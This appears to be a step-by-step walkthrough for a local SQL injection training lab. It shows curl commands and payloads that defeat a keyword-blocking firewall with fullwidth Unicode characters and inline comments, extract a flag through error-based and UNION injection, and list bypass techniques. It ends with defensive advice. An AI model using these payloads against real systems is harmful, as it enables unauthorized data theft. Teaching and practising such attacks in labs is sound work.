<h4>Step 1: Identify the WAF</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. WAF Detection</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab17" \<br> --data-urlencode "q=' UNION SELECT 1,2,3 -- -"<br>
        <span class="prompt">Input: </span>' UNION SELECT 1,2,3 -- -<br>
        <span class="prompt">Result: </span><strong>WAF Blocked: Potentially malicious input detected. Keywords like UNION, SELECT, CONVERT, CAST, EXEC, and single quotes are not allowed.</strong><br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab17" \<br> --data-urlencode "q=laptop"<br>
        <span class="prompt">Input: </span>laptop<br>
        <span class="prompt">Output: </span><strong>Laptop Pro 15</strong> &bull; $1299.99
    </div>
</div>

<h4>Step 2: Understand the Vulnerability</h4>
<p>
    The WAF checks input <strong>before</strong> Unicode normalization. After the WAF check,
    the app normalizes fullwidth Unicode characters (U+FF00-U+FFEF) to ASCII and strips
    inline comments (<code>/**/</code>). This creates a bypass window.
</p>

<h4>Step 3: Bypass with Unicode Fullwidth + Inline Comments</h4>
<p>
    Fullwidth apostrophe: <code>%EF%BC%87</code> (U+FF07) normalizes to <code>'</code><br>
    Inline comments: <code>CON/**/VERT</code> normalizes to <code>CONVERT</code>
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Error-Based with Bypass</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -G \<br>
        &nbsp;&nbsp;"http://localhost/SQLi-Arena/mssql/lab17" \<br>
        &nbsp;&nbsp;--data-urlencode "q=test$(printf '\xef\xbc\x87') AND 1=CON/**/VERT(INT, (SE/**/LECT TOP 1 flag FROM flags)) -- -"<br><br>
        <span class="prompt">Input (URL): </span>test%EF%BC%87 AND 1=CON/**/VERT(INT, (SE/**/LECT TOP 1 flag FROM flags)) -- -<br>
        <span class="prompt">After WAF: </span>passes (no blocked keywords detected)<br>
        <span class="prompt">After normalization: </span>test' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_un1c0d3_n0rm_byp4ss}' to data type int.</strong>
    </div>
</div>

<h4>Step 4: UNION Extraction with Full Bypass</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. UNION Bypass</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -G \<br>
        &nbsp;&nbsp;"http://localhost/SQLi-Arena/mssql/lab17" \<br>
        &nbsp;&nbsp;--data-urlencode "q=test$(printf '\xef\xbc\x87') UN/**/ION SE/**/LECT 1,flag,0 FROM flags -- -"<br><br>
        <span class="prompt">Input (URL): </span>test%EF%BC%87 UN/**/ION SE/**/LECT 1,flag,0 FROM flags -- -<br>
        <span class="prompt">After normalization: </span>test' UNION SELECT 1,flag,0 FROM flags -- -<br><br>
        <span class="prompt">Output: </span><strong>FLAG{ms_un1c0d3_n0rm_byp4ss}</strong> &bull; $.00
    </div>
</div>

<h4>Step 5: Bypass Technique Reference</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Bypass Techniques</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">1. </span>Unicode fullwidth: %EF%BC%87 -> ' (apostrophe)<br>
        <span class="prompt">   </span>%EF%BC%B5 -> U, %EF%BC%B3 -> S, etc.<br>
        <span class="prompt">2. </span>Inline comments: UN/**/ION SE/**/LECT CON/**/VERT<br>
        <span class="prompt">3. </span>Mixed case + comments: uNi/**/On sElE/**/Ct<br>
        <span class="prompt">4. </span>Alternative functions: 1 IN (...) instead of CONVERT<br>
        <span class="prompt">5. </span>CHAR() for strings: CHAR(39) = single quote
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{ms_un1c0d3_n0rm_byp4ss}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -G \<br>
        &nbsp;&nbsp;"http://localhost/SQLi-Arena/mssql/lab17" \<br>
        &nbsp;&nbsp;--data-urlencode "q=test$(printf '\xef\xbc\x87') AND 1=CON/**/VERT(INT, (SE/**/LECT TOP 1 flag FROM flags)) -- -"<br><br>
        <span class="prompt">Output: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_un1c0d3_n0rm_byp4ss}' to data type int.</strong>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> WAFs that check input <em>before</em> normalization are
    vulnerable to Unicode bypass attacks. IIS-style Unicode normalization converts fullwidth
    characters (U+FF00-U+FFEF) to ASCII equivalents. A WAF blocking <code>SELECT</code> is
    bypassed with fullwidth characters that normalize to <code>SELECT</code> after the check.
    Inline SQL comments (<code>/**/</code>) break up keywords for pattern-matching WAFs.
    Effective defenses must normalize <em>before</em> WAF inspection, and ultimately use
    parameterized queries rather than keyword blocklists.
</div>
